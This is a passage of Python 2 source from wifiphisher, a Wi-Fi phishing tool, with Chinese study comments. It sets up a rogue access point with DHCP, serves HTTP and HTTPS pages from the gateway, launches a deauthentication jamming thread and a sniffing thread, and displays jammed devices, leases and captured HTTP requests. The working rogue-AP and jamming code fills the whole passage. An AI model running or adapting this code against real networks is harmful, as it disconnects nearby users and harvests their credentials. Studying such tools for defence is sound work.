    if not dhcp(dhcpconf, strongest_iface):
        print('[' + G + '+' + W + 
            '] Could not set IP address on %s!' % strongest_iface)
        shutdown()
    os.system('clear')
    print ('[' + T + '*' + W + '] ' + T +
           essid + W + ' set up on channel ' +
           T + channel + W + ' via ' + T + strongest_iface +
           W + ' on ' + T + str(strongest_iface) + W)

    # With configured DHCP, we may now start the web server
    # Start HTTP server in a background thread
    # 后台开启HTTP服务
    Handler = HTTPRequestHandler
    try:
        httpd = HTTPServer((NETWORK_GW_IP, PORT), Handler)
    except socket.error, v:
        errno = v[0]
        sys.exit((
            '\n[' + R + '-' + W + '] Unable to start HTTP server (socket errno ' + str(errno) + ')!\n' +
            '[' + R + '-' + W + '] Maybe another process is running on port ' + str(PORT) + '?\n' +
            '[' + R + '!' + W + '] Closing'
        ))
    print '[' + T + '*' + W + '] Starting HTTP server at port ' + str(PORT)
    webserver = Thread(target=httpd.serve_forever)
    webserver.daemon = True
    webserver.start()

    # Start HTTPS server in a background thread
    # 后台开启HTTPS服务
    Handler = SecureHTTPRequestHandler
    try:
        httpd = SecureHTTPServer((NETWORK_GW_IP, SSL_PORT), Handler)
    except socket.error, v:
        errno = v[0]
        sys.exit((
            '\n[' + R + '-' + W + '] Unable to start HTTPS server (socket errno ' + str(errno) + ')!\n' +
            '[' + R + '-' + W + '] Maybe another process is running on port ' + str(SSL_PORT) + '?\n' +
            '[' + R + '!' + W + '] Closing'
        ))
    print ('[' + T + '*' + W + '] Starting HTTPS server at port ' +
           str(SSL_PORT))
    secure_webserver = Thread(target=httpd.serve_forever)
    secure_webserver.daemon = True
    secure_webserver.start()

    time.sleep(3)

    clients_APs = [] # 用户列表
    APs = [] # AP列表
    args.accesspoint = ap_mac
    args.channel = channel
    monitor_on = None
    conf.iface = strongest_iface

    # 得到伪AP的mac
    mon_MAC = mon_mac(strongest_iface)

    # 请结合channel_hop2()查看其作用
    first_pass = 1

    monchannel = channel

    # Start channel hopping
    # 启动跳信道的线程，进行deauth攻击
    hop = Thread(target=channel_hop2, args=(virtual_iface,))
    hop.daemon = True
    hop.start()

    # Start sniffing
    # 启动嗅探线程
    sniff_thread = Thread(target=sniff_dot11, args=(virtual_iface,))
    sniff_thread.daemon = True
    sniff_thread.start()

    # Main loop.
    # 读数据，与用户交互
    try:
        while 1:
            os.system("clear")
            print "Jamming devices: "
            if os.path.isfile('/tmp/wifiphisher-jammer.tmp'):
                # in subprocess
                proc = check_output(['cat', '/tmp/wifiphisher-jammer.tmp'])
                lines = proc.split('\n')
                lines += ["\n"] * (5 - len(lines))
            else:
                lines = ["\n"] * 5
            for l in lines:
                print l
            print "DHCP Leases: "
            if os.path.isfile('/var/lib/misc/dnsmasq.leases'):
                proc = check_output(['cat', '/var/lib/misc/dnsmasq.leases'])
                lines = proc.split('\n')
                lines += ["\n"] * (5 - len(lines))
            else:
                lines = ["\n"] * 5
            for l in lines:
                print l
            print "HTTP requests: "
            if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
                proc = check_output(
                    ['tail', '-5', '/tmp/wifiphisher-webserver.tmp']
                )
                lines = proc.split('\n')
                lines += ["\n"] * (5 - len(lines))
            else:
                lines = ["\n"] * 5
            for l in lines:
                print l
            if terminate: # False
                time.sleep(3)
                shutdown()
            time.sleep(0.5)
    except KeyboardInterrupt:
        shutdown()
